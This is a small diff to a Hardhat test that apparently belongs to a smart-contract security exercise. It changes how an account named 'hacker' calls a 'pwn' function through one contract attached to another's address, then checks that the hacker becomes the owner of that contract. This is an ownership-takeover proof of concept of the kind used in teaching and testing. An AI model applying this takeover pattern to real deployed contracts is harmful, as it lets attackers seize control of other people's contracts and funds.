@@ -28,12 +28,7 @@ describe('Simple', () => {
     expect(await d2.owner()).to.eq(deployer.address);
 
     // hack
-    const tx = await hacker.sendTransaction({
-      to: d2.address,
-      data: d1.interface.encodeFunctionData('pwn'),
-    });
-    await tx.wait();
-    // error in hardhat network
+    await d1.attach(d2.address).connect(hacker).pwn();
     expect(await d2.owner()).to.eq(hacker.address);
   });
 });
